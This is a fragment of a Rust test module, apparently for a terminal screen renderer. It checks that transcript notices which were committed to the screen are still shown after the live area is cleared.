    fn leaving_without_committing_loses_nothing_that_was_committed() {
        let mut screen = screen(30, 10);
        let mut app = app();
        for i in 0..3 {
            app.transcript.notice(format!("n{i}"));
        }
        screen.render(&mut app).unwrap();
        screen.commit_all(&mut app).unwrap();
        screen.clear_live().unwrap();
        let expected: Vec<String> = (0..3).map(|i| format!("· n{i}")).collect();
        assert_eq!(nonblank(everything(&screen)), expected);
    }
}
